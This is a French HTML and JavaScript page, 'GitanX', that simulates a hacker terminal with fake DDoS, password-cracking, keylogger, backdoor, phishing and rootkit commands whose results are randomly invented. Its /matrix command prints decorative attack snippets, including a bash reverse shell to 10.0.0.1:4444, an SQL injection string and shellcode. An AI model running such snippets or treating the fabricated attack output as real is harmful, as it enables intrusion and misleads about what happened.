<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitanX - Terminal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000000;
            font-family: 'Courier New', monospace;
            color: #00ff41;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            padding: 20px;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            border: 2px solid #00ff41;
            padding: 15px;
            margin-bottom: 20px;
            background: rgba(0, 255, 65, 0.05);
            text-align: center;
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
        }

        .header h1 {
            font-size: 24px;
            text-shadow: 0 0 10px #00ff41;
            margin-bottom: 10px;
        }

        .header p {
            font-size: 12px;
            color: #00cc33;
        }

        .terminal {
            flex: 1;
            border: 2px solid #00ff41;
            padding: 15px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.9);
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3), inset 0 0 50px rgba(0, 255, 65, 0.05);
        }

        .output-line {
            margin: 5px 0;
            animation: fadeIn 0.3s;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .input-line {
            display: flex;
            margin-top: 10px;
            align-items: center;
        }

        .prompt {
            color: #00ff41;
            margin-right: 10px;
        }

        input {
            flex: 1;
            background: transparent;
            border: none;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            outline: none;
        }

        .error {
            color: #ff0000;
        }

        .warning {
            color: #ffff00;
        }

        .info {
            color: #00ccff;
        }

        .success {
            color: #00ff41;
        }

        .cursor {
            display: inline-block;
            width: 8px;
            height: 16px;
            background: #00ff41;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 49% { opacity: 1; }
            50%, 100% { opacity: 0; }
        }

        .ascii-art {
            color: #00ff41;
            font-size: 10px;
            line-height: 1.2;
        }

        .help-section {
            margin: 10px 0;
            padding: 10px;
            border-left: 3px solid #00ff41;
            background: rgba(0, 255, 65, 0.05);
        }
    </style>
</head>
<body>
    <!-- Fond animé avec lignes de code -->
    <canvas id="matrixBg" style="
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: -1;
        opacity: 0.15;
    "></canvas>

    <!-- Écran de démarrage amélioré -->
    <div id="splashScreen" style="
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100vh;
        background: #000000;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 9999;
        cursor: pointer;
    ">
        <div style="
            font-size: 96px;
            font-weight: bold;
            color: #00ff41;
            text-shadow: 0 0 20px #00ff41, 0 0 40px #00ff41, 0 0 60px #00ff41, 0 0 80px #00ff41;
            font-family: 'Courier New', monospace;
            animation: glowPulse 2s ease-in-out infinite;
            letter-spacing: 10px;
        ">GitanX</div>
        
        <div style="
            margin-top: 20px;
            font-size: 14px;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            opacity: 0.6;
        ">ADVANCED PENETRATION SYSTEM v2.5.1</div>
        
        <div style="
            margin-top: 50px;
            width: 300px;
            height: 4px;
            background: rgba(0, 255, 65, 0.2);
            border-radius: 2px;
            overflow: hidden;
        ">
            <div style="
                width: 100%;
                height: 100%;
                background: #00ff41;
                animation: loadingBar 2s ease-in-out infinite;
                box-shadow: 0 0 10px #00ff41;
            "></div>
        </div>
        
        <div style="
            margin-top: 30px;
            font-size: 16px;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            opacity: 0.8;
            animation: blink 1.5s ease-in-out infinite;
        ">&gt; click to initialize_</div>
    </div>

    <style>
        @keyframes glowPulse {
            0%, 100% { 
                text-shadow: 0 0 20px #00ff41, 0 0 40px #00ff41, 0 0 60px #00ff41, 0 0 80px #00ff41;
                transform: scale(1);
            }
            50% { 
                text-shadow: 0 0 30px #00ff41, 0 0 60px #00ff41, 0 0 90px #00ff41, 0 0 120px #00ff41;
                transform: scale(1.05);
            }
        }
        
        @keyframes loadingBar {
            0% { transform: translateX(-100%); }
            50% { transform: translateX(0%); }
            100% { transform: translateX(100%); }
        }
    </style>

    <div class="container" style="display: none;" id="mainContent">
        <div class="header">
            <h1>⚡ GitanX ⚡</h1>
            <p>/help | /scan | /ddos | /ip | /status | /crack | /exploit | /keylog | /trace</p>
            <p>/backdoor | /phish | /rootkit | /nmap | /matrix | /clear</p>
        </div>

        <div class="terminal" id="terminal">
            <div class="output-line info">Système GitanX initialisé...</div>
        </div>

        <div class="input-line">
            <span class="prompt">gitanx@root:~$</span>
            <input type="text" id="commandInput" autofocus>
            <span class="cursor"></span>
        </div>
    </div>

    <script>
        // Animation Matrix en fond
        const canvas = document.getElementById('matrixBg');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*(){}[]<>/\\|~`';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        
        for(let i = 0; i < columns; i++) {
            drops[i] = Math.random() * -100;
        }
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#00ff41';
            ctx.font = fontSize + 'px monospace';
            
            for(let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 35);
        
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        // Gestion de l'écran de démarrage amélioré
        document.getElementById('splashScreen').addEventListener('click', function() {
            this.style.transition = 'opacity 0.8s ease-out';
            this.style.opacity = '0';
            setTimeout(() => {
                this.style.display = 'none';
                document.getElementById('mainContent').style.display = 'flex';
            }, 800);
        });

        const terminal = document.getElementById('terminal');
        const input = document.getElementById('commandInput');

        function addOutput(text, className = '') {
            const line = document.createElement('div');
            line.className = `output-line ${className}`;
            line.textContent = text;
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function simulateProgress(message, duration = 2000) {
            return new Promise(resolve => {
                const steps = 20;
                const interval = duration / steps;
                let progress = 0;

                const progressLine = document.createElement('div');
                progressLine.className = 'output-line';
                terminal.appendChild(progressLine);

                const timer = setInterval(() => {
                    progress += 5;
                    progressLine.textContent = `${message} [${'█'.repeat(progress/5)}${'.'.repeat(20-progress/5)}] ${progress}%`;
                    
                    if (progress >= 100) {
                        clearInterval(timer);
                        resolve();
                    }
                }, interval);

                terminal.scrollTop = terminal.scrollHeight;
            });
        }

        const commands = {
            '/help': () => {
                addOutput('═══════════════════════════════════════', 'info');
                addOutput('╔═══════════════════════════════════╗', 'info');
                addOutput('║   GitanX v2.5.1 - COMMAND LIST   ║', 'info');
                addOutput('╚═══════════════════════════════════╝', 'info');
                addOutput('═══════════════════════════════════════', 'info');
                addOutput('RÉSEAU & RECONNAISSANCE:', 'warning');
                addOutput('  /scan       - Scanner de réseau avancé');
                addOutput('  /nmap       - Scan de ports détaillé');
                addOutput('  /ip         - Informations réseau complètes');
                addOutput('  /trace      - Traçage de route et latence');
                addOutput('');
                addOutput('ATTAQUE & EXPLOITATION:', 'error');
                addOutput('  /ddos       - Attaque DDoS distribuée');
                addOutput('  /exploit    - Scanner de vulnérabilités');
                addOutput('  /crack      - Force brute de mots de passe');
                addOutput('  /backdoor   - Installation de porte dérobée');
                addOutput('  /rootkit    - Implantation de rootkit');
                addOutput('');
                addOutput('SOCIAL ENGINEERING:', 'warning');
                addOutput('  /phish      - Générateur de phishing');
                addOutput('  /keylog     - Enregistreur de frappes');
                addOutput('');
                addOutput('SYSTÈME:', 'success');
                addOutput('  /status     - État du système GitanX');
                addOutput('  /matrix     - Mode injection de code');
                addOutput('  /clear      - Effacer le terminal');
                addOutput('  /help       - Afficher cette aide');
                addOutput('═══════════════════════════════════════', 'info');
            },

            '/scan': async () => {
                addOutput('> Initialisation du scanner de réseau...', 'info');
                addOutput('> Détection de l\'interface réseau...', 'info');
                await new Promise(r => setTimeout(r, 600));
                addOutput('  └─ Interface: eth0 - 192.168.1.0/24', 'success');
                addOutput('> Lancement du scan de ports...', 'info');
                await simulateProgress('Scan en cours', 2000);
                addOutput('✓ Scan terminé', 'success');
                addOutput('═══════════════════════════════════════', 'info');
                addOutput('Hôtes découverts:');
                
                const devices = [
                    { ip: '192.168.1.1', device: 'Router', ports: '22,80,443,8080' },
                    { ip: '192.168.1.10', device: 'Desktop-PC', ports: '135,139,445' },
                    { ip: '192.168.1.15', device: 'Smartphone', ports: '80,443' },
                    { ip: '192.168.1.23', device: 'Laptop', ports: '22,3389,5900' },
                    { ip: '192.168.1.42', device: 'IoT-Camera', ports: '80,554,8000' },
                    { ip: '192.168.1.55', device: 'NAS-Server', ports: '21,22,80,443,445' },
                    { ip: '192.168.1.78', device: 'Smart-TV', ports: '80,8008,9000' },
                    { ip: '192.168.1.99', device: 'Gaming-Console', ports: '3074,3075,3076' }
                ];
                
                for(const d of devices) {
                    await new Promise(r => setTimeout(r, 150));
                    addOutput(`  • ${d.ip} - [${d.device}]`, 'success');
                    addOutput(`    └─ Ports ouverts: ${d.ports}`, 'info');
                }
                
                addOutput('═══════════════════════════════════════', 'info');
                addOutput(`Total: ${devices.length} hôtes actifs détectés`);
            },

            '/ddos': async () => {
                const target = `target-${Math.floor(Math.random() * 999)}.server.net`;
                addOutput(`> Cible sélectionnée: ${target}`, 'info');
                addOutput('> Initialisation des modules d\'attaque...', 'info');
                await new Promise(r => setTimeout(r, 800));
                addOutput('> Chargement de Slowloris...', 'success');
                addOutput('> Chargement de LOIC...', 'success');
                addOutput('> Chargement de UDP Flood...', 'success');
                await simulateProgress('Construction des paquets', 2000);
                addOutput('> Configuration des bots...', 'warning');
                addOutput(`  └─ Bots actifs: ${Math.floor(Math.random() * 500 + 200)}`, 'warning');
                addOutput('> Début de l\'attaque...', 'error');
                await simulateProgress('Envoi massif de requêtes', 2500);
                addOutput('> Saturation de la bande passante...', 'warning');
                await new Promise(r => setTimeout(r, 1000));
                addOutput('✓ Attaque DDoS terminée', 'success');
                addOutput('═══════════════════════════════════════', 'info');
                addOutput(`Statistiques:`);
                addOutput(`  • Paquets envoyés: ${Math.floor(Math.random() * 50000 + 10000)}`);
                addOutput(`  • Bande passante: ${Math.floor(Math.random() * 500 + 200)} GB`);
                addOutput(`  • Connexions simultanées: ${Math.floor(Math.random() * 2000 + 500)}`);
                addOutput(`  • Durée: ${Math.floor(Math.random() * 60 + 30)}s`);
                addOutput(`  • Serveur: OFFLINE`, 'error');
                addOutput('═══════════════════════════════════════', 'info');
            },

            '/ip': async () => {
                addOutput('> Récupération des informations réseau...', 'info');
                await simulateProgress('Analyse en cours', 1000);
                
                try {
                    // Tentative de récupérer la vraie IP via une API
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    addOutput('═══════════════════════════════════════', 'info');
                    addOutput(`Adresse IP publique: ${data.ip}`, 'success');
                } catch {
                    // Si l'API ne fonctionne pas, afficher une IP aléatoire
                    const randomIP = Array.from({length: 4}, () => Math.floor(Math.random() * 255)).join('.');
                    addOutput('═══════════════════════════════════════', 'info');
                    addOutput(`Adresse IP publique: ${randomIP}`, 'success');
                }
                
                addOutput(`Adresse IP locale: 192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`, 'info');
                addOutput(`Masque de sous-réseau: 255.255.255.0`, 'info');
                addOutput(`Passerelle: 192.168.1.1`, 'info');
                
                const locations = ['Paris', 'Lyon', 'Marseille', 'Toulouse', 'Nice', 'Nantes', 'Strasbourg', 'Bordeaux'];
                addOutput(`Localisation: ${locations[Math.floor(Math.random() * locations.length)]}, France`, 'warning');
                addOutput(`FAI: Orange/Free/SFR/Bouygues`, 'info');
                addOutput('═══════════════════════════════════════', 'info');
            },

            '/status': () => {
                addOutput('═══ ÉTAT DU SYSTÈME ═══', 'success');
                addOutput(`CPU: ${Math.floor(Math.random() * 100)}%`);
                addOutput(`RAM: ${Math.floor(Math.random() * 100)}%`);
                addOutput(`Connexions actives: ${Math.floor(Math.random() * 50)}`);
                addOutput('Status: ✓ OPÉRATIONNEL', 'success');
            },

            '/matrix': async () => {
                addOutput('> Mode Matrix activé...', 'success');
                addOutput('> Injection de code dans la matrice...', 'success');
                await new Promise(r => setTimeout(r, 500));
                
                const codeLines = [
                    'import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)',
                    'def exploit(target,port): return s.connect((target,port))',
                    'for i in range(0x00,0xFF): buffer += struct.pack("<I",0x7E4507EA)',
                    'shellcode = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"',
                    'payload = NOP_SLED + shellcode + ret_address * overflow_offset',
                    'vuln_function = ctypes.CDLL(libc).system(cmd.encode())',
                    'exec(__import__("base64").b64decode("aW1wb3J0IG9z").decode())',
                    'packet = Ether()/IP(dst=target)/TCP(dport=port,flags="S")',
                    'subprocess.Popen(["curl","-X","POST",url,"-d",data],shell=False)',
                    'privesc = os.system("sudo -u root /bin/bash -i")',
                    'xor_key = [0x13,0x37,0x42,0x69]; encrypted = [a^b for a,b in zip(data,xor_key)]',
                    'reverse_shell = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"',
                    'SQL_INJECTION = "1\' OR \'1\'=\'1\' --"',
                    'kernel_exploit = mmap(NULL, size, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE)',
                    'memcpy(buffer, shellcode, sizeof(shellcode)); ((void(*)())buffer)()',
                    'bypass_aslr = leak_address & 0xFFFFFFFFFFFFF000',
                    'hash_crack = hashlib.md5(password.encode()).hexdigest()',
                    'keylogger = pynput.keyboard.Listener(on_press=on_key_press)',
                    'RAT_connection = paramiko.SSHClient(); RAT_connection.connect(hostname,username,password)',
                    'privilege_escalation: SetUID(0); SetGID(0); execve("/bin/sh",NULL,NULL)'
                ];
                
                for(let i = 0; i < 25; i++) {
                    const line = codeLines[Math.floor(Math.random() * codeLines.length)];
                    const prefix = ['>>>', '[*]', '[+]', '   '][Math.floor(Math.random() * 4)];
                    addOutput(`${prefix} ${line}`, 'success');
                    await new Promise(r => setTimeout(r, 100));
                }
                
                addOutput('> Accès à la matrice établi...', 'success');
                addOutput('> Tous les systèmes sont compromis...', 'error');
            },

            '/clear': () => {
                terminal.innerHTML = '<div class="output-line success">Terminal effacé</div>';
            },

            '/crack': async () => {
                const target = ['admin', 'root', 'user', 'administrator'][Math.floor(Math.random() * 4)];
                addOutput(`> Cible sélectionnée: ${target}@system`, 'info');
                addOutput('> Chargement du dictionnaire de mots de passe...', 'info');
                await new Promise(r => setTimeout(r, 600));
                addOutput('> Dictionnaire chargé: 10,000,000+ mots de passe', 'success');
                addOutput('> Démarrage de l\'attaque par force brute...', 'warning');
                await simulateProgress('Tentatives en cours', 2500);
                
                const passwords = ['password123', 'admin123', 'letmein', 'welcome1', 'qwerty123', 'P@ssw0rd'];
                for(let i = 0; i < 8; i++) {
                    const attempt = passwords[Math.floor(Math.random() * passwords.length)] + Math.floor(Math.random() * 999);
                    await new Promise(r => setTimeout(r, 200));
                    addOutput(`[FAIL] Tentative: ${attempt}`, 'error');
                }
                
                await new Promise(r => setTimeout(r, 800));
                const crackedPass = passwords[Math.floor(Math.random() * passwords.length)];
                addOutput(`[SUCCESS] Mot de passe trouvé: ${crackedPass}`, 'success');
                addOutput('═══════════════════════════════════════', 'info');
                addOutput(`Compte compromis: ${target}@system`);
                addOutput(`Mot de passe: ${crackedPass}`);
                addOutput(`Tentatives: ${Math.floor(Math.random() * 50000 + 10000)}`);
                addOutput(`Temps écoulé: ${Math.floor(Math.random() * 300 + 60)}s`);
                addOutput('═══════════════════════════════════════', 'info');
            },

            '/exploit': async () => {
                addOutput('> Recherche de vulnérabilités...', 'info');
                await simulateProgress('Scan des failles', 1800);
                addOutput('✓ Analyse terminée', 'success');
                addOutput('═══════════════════════════════════════', 'info');
                addOutput('Vulnérabilités détectées:', 'warning');
                const exploits = [
                    'CVE-2024-1337 - Buffer Overflow [CRITIQUE]',
                    'CVE-2024-9999 - SQL Injection [HAUTE]',
                    'CVE-2024-4242 - RCE Apache [CRITIQUE]',
                    'CVE-2024-7777 - XSS Stored [MOYENNE]',
                    'CVE-2024-6666 - Path Traversal [HAUTE]'
                ];
                for(const exp of exploits) {
                    await new Promise(r => setTimeout(r, 150));
                    addOutput(`  • ${exp}`, 'error');
                }
                addOutput('═══════════════════════════════════════', 'info');
                await new Promise(r => setTimeout(r, 500));
                addOutput('> Exploitation en cours...', 'warning');
                await simulateProgress('Injection du payload', 2000);
                addOutput('✓ Exploitation réussie - Shell obtenu', 'success');
                addOutput('> Accès root: GRANTED', 'success');
            },

            '/keylog': async () => {
                addOutput('> Initialisation du keylogger...', 'info');
                await new Promise(r => setTimeout(r, 600));
                addOutput('> Hook clavier installé', 'success');
                addOutput('> Enregistrement démarré...', 'success');
                await simulateProgress('Capture des frappes', 2000);
                addOutput('═══════════════════════════════════════', 'info');
                addOutput('Frappes capturées:', 'warning');
                const keystrokes = [
                    '[08:32:15] facebook.com',
                    '[08:32:22] user: john.doe@email.com',
                    '[08:32:35] pass: MyP@ssw0rd2024',
                    '[08:45:12] amazon.com',
                    '[08:45:20] Carte: 4532 **** **** 1234',
                    '[09:15:33] gmail.com - inbox',
                    '[09:20:45] Message: "Réunion à 14h"'
                ];
                for(const key of keystrokes) {
                    await new Promise(r => setTimeout(r, 250));
                    addOutput(`  ${key}`, 'warning');
                }
                addOutput('═══════════════════════════════════════', 'info');
                addOutput(`Total capturé: ${Math.floor(Math.random() * 5000 + 1000)} frappes`);
            },

            '/trace': async () => {
                const targetIP = Array.from({length: 4}, () => Math.floor(Math.random() * 255)).join('.');
                addOutput(`> Traçage de la connexion vers ${targetIP}...`, 'info');
                await new Promise(r => setTimeout(r, 600));
                addOutput('> Initialisation du traceroute...', 'info');
                await simulateProgress('Traçage en cours', 1500);
                addOutput('═══════════════════════════════════════', 'info');
                
                const hops = [
                    { hop: 1, ip: '192.168.1.1', host: 'gateway.local', time: '1ms' },
                    { hop: 2, ip: '10.0.0.1', host: 'isp-router-1', time: '5ms' },
                    { hop: 3, ip: '172.16.0.1', host: 'core-router-paris', time: '12ms' },
                    { hop: 4, ip: '203.0.113.1', host: 'backbone-fr', time: '25ms' },
                    { hop: 5, ip: '198.51.100.1', host: 'eu-west-1', time: '38ms' },
                    { hop: 6, ip: targetIP, host: 'target.server.net', time: '45ms' }
                ];
                
                for(const h of hops) {
                    await new Promise(r => setTimeout(r, 300));
                    addOutput(`${h.hop}  ${h.ip}  [${h.host}]  ${h.time}`, 'success');
                }
                
                addOutput('═══════════════════════════════════════', 'info');
                addOutput('> Traçage terminé', 'success');
                addOutput(`Destination: ${targetIP}`);
                addOutput(`Sauts: ${hops.length}`);
                addOutput(`Latence totale: 45ms`);
            },

            '/backdoor': async () => {
                addOutput('> Initialisation du backdoor...', 'info');
                await new Promise(r => setTimeout(r, 600));
                addOutput('> Génération du payload...', 'warning');
                await simulateProgress('Compilation du backdoor', 2000);
                addOutput('✓ Payload généré: backdoor.exe (245KB)', 'success');
                addOutput('> Injection dans le système cible...', 'warning');
                await simulateProgress('Injection en cours', 1800);
                addOutput('✓ Backdoor installé avec succès', 'success');
                addOutput('═══════════════════════════════════════', 'info');
                addOutput('Configuration du backdoor:', 'info');
                const port = Math.floor(Math.random() * 9000 + 1000);
                addOutput(`  • Port d'écoute: ${port}`);
                addOutput('  • Persistance: ACTIVÉE');
                addOutput('  • Privilege: SYSTEM/ROOT');
                addOutput('  • Détection: CONTOURNÉE');
                addOutput('═══════════════════════════════════════', 'info');
                await new Promise(r => setTimeout(r, 500));
                addOutput('> Établissement de la connexion inverse...', 'warning');
                await simulateProgress('Connexion au C&C', 1500);
                addOutput('✓ Shell distant établi', 'success');
                addOutput('> Contrôle total du système acquis', 'success');
            },

            '/phish': async () => {
                addOutput('> Lancement du générateur de phishing...', 'info');
                await new Promise(r => setTimeout(r, 600));
                addOutput('> Sélection de la cible...', 'warning');
                const targets = ['Facebook', 'Gmail', 'PayPal', 'Amazon', 'Netflix', 'Microsoft'];
                const target = targets[Math.floor(Math.random() * targets.length)];
                addOutput(`  └─ Cible: ${target}`, 'warning');
                await simulateProgress('Clonage de la page', 1800);
                addOutput('✓ Page clonée avec succès', 'success');
                addOutput('═══════════════════════════════════════', 'info');
                addOutput('Configuration de la campagne:', 'info');
                addOutput(`  • Page: ${target.toLowerCase()}-secure-login.com`);
                addOutput('  • SSL: CERTIFICAT VALIDE ✓');
                addOutput('  • Redirect: CONFIGURÉE');
                addOutput('  • Logs: ACTIVÉS');
                addOutput('═══════════════════════════════════════', 'info');
                await new Promise(r => setTimeout(r, 500));
                addOutput('> Génération des emails de phishing...', 'warning');
                await simulateProgress('Création des templates', 1200);
                addOutput('✓ 500 emails générés', 'success');
                addOutput('> Campagne prête à être lancée', 'success');
                addOutput(`  └─ Taux de succès estimé: ${Math.floor(Math.random() * 20 + 10)}%`);
            },

            '/rootkit': async () => {
                addOutput('> Initialisation du rootkit...', 'error');
                await new Promise(r => setTimeout(r, 600));
                addOutput('> Analyse du système cible...', 'warning');
                await simulateProgress('Scan des défenses', 1500);
                addOutput('✓ Défenses identifiées', 'success');
                addOutput('> Désactivation de l\'antivirus...', 'warning');
                await simulateProgress('Bypass en cours', 2000);
                addOutput('✓ Antivirus neutralisé', 'success');
                addOutput('═══════════════════════════════════════', 'info');
                addOutput('Installation des modules:', 'error');
                const modules = [
                    'Hook système - kernel32.dll',
                    'Masquage de processus',
                    'Masquage de fichiers',
                    'Masquage de clés de registre',
                    'Interception réseau',
                    'Élévation de privilèges'
                ];
                for(const mod of modules) {
                    await new Promise(r => setTimeout(r, 300));
                    addOutput(`  [+] ${mod}`, 'success');
                }
                addOutput('═══════════════════════════════════════', 'info');
                await new Promise(r => setTimeout(r, 500));
                addOutput('> Installation des hooks noyau...', 'error');
                await simulateProgress('Injection dans le kernel', 1800);
                addOutput('✓ Rootkit complètement invisible', 'success');
                addOutput('> Contrôle niveau kernel obtenu', 'error');
            },

            '/nmap': async () => {
                const targetIP = Array.from({length: 4}, () => Math.floor(Math.random() * 255)).join('.');
                addOutput('> Lancement de Nmap Security Scanner...', 'info');
                addOutput(`> Cible: ${targetIP}`, 'info');
                await new Promise(r => setTimeout(r, 600));
                addOutput('> Scan de détection de l\'OS...', 'warning');
                await simulateProgress('Analyse en cours', 2000);
                addOutput('═══════════════════════════════════════', 'info');
                addOutput('Résultats du scan:', 'success');
                addOutput(`Host: ${targetIP} - UP`, 'success');
                addOutput('OS: Linux 5.15.0 (Ubuntu 22.04)', 'info');
                addOutput('');
                addOutput('Ports ouverts:');
                const ports = [
                    { port: 21, service: 'FTP', version: 'vsftpd 3.0.3' },
                    { port: 22, service: 'SSH', version: 'OpenSSH 8.9p1' },
                    { port: 80, service: 'HTTP', version: 'Apache 2.4.52' },
                    { port: 443, service: 'HTTPS', version: 'Apache 2.4.52' },
                    { port: 3306, service: 'MySQL', version: 'MySQL 8.0.32' },
                    { port: 8080, service: 'HTTP-Proxy', version: 'Squid 5.2' }
                ];
                for(const p of ports) {
                    await new Promise(r => setTimeout(r, 200));
                    addOutput(`  ${p.port}/tcp   OPEN   ${p.service}   ${p.version}`, 'success');
                }
                addOutput('═══════════════════════════════════════', 'info');
                addOutput('Vulnérabilités détectées:', 'error');
                addOutput('  • Port 21: FTP Anonymous login enabled');
                addOutput('  • Port 22: SSH weak ciphers detected');
                addOutput('  • Port 3306: MySQL root sans mot de passe');
                addOutput('═══════════════════════════════════════', 'info');
                addOutput(`Scan terminé: ${ports.length} ports ouverts`);
            },
        };

        input.addEventListener('keypress', async (e) => {
            if (e.key === 'Enter') {
                const command = input.value.trim();
                
                if (command) {
                    addOutput(`gitanx@root:~$ ${command}`, 'warning');
                    
                    if (commands[command]) {
                        await commands[command]();
                    } else {
                        addOutput(`Commande inconnue: ${command}`, 'error');
                        addOutput('Tapez /help pour voir les commandes disponibles');
                    }
                }
                
                input.value = '';
            }
        });

        // Message de bienvenue automatique
        setTimeout(async () => {
            const bootSequence = [
                { text: '[BOOT] Chargement du noyau GitanX v2.5.1...', delay: 100, class: 'info' },
                { text: '[BOOT] Initialisation des modules système...', delay: 150, class: 'info' },
                { text: '[OK] Module de cryptographie chargé', delay: 100, class: 'success' },
                { text: '[OK] Module réseau initialisé', delay: 100, class: 'success' },
                { text: '[OK] Module d\'exploitation chargé', delay: 120, class: 'success' },
                { text: '[OK] Module de scan de ports activé', delay: 100, class: 'success' },
                { text: '[OK] Module DDoS armé', delay: 130, class: 'success' },
                { text: '[OK] Module keylogger prêt', delay: 100, class: 'success' },
                { text: '[OK] Module reverse shell actif', delay: 110, class: 'success' },
                { text: '[INIT] Établissement de la connexion sécurisée...', delay: 200, class: 'info' },
                { text: '[INIT] Chargement des exploits 0-day...', delay: 180, class: 'warning' },
                { text: '[INIT] Bypass des firewalls en cours...', delay: 150, class: 'warning' },
                { text: '[OK] Connexion établie - Accès root obtenu', delay: 150, class: 'success' },
                { text: '[SYSTEM] GitanX opérationnel', delay: 200, class: 'success' },
                { text: '', delay: 100 },
                { text: '═══════════════════════════════════════', delay: 50, class: 'info' },
                { text: 'Commandes disponibles:', delay: 50, class: 'info' },
                { text: '/help | /scan | /ddos | /ip | /status | /crack', delay: 50, class: 'success' },
                { text: '/exploit | /keylog | /trace | /backdoor | /phish', delay: 50, class: 'success' },
                { text: '/rootkit | /nmap | /matrix | /clear', delay: 50, class: 'success' },
                { text: '═══════════════════════════════════════', delay: 50, class: 'info' }
            ];

            for (const line of bootSequence) {
                await new Promise(resolve => setTimeout(resolve, line.delay));
                addOutput(line.text, line.class || '');
            }
        }, 1000);
    </script>
</body>
</html>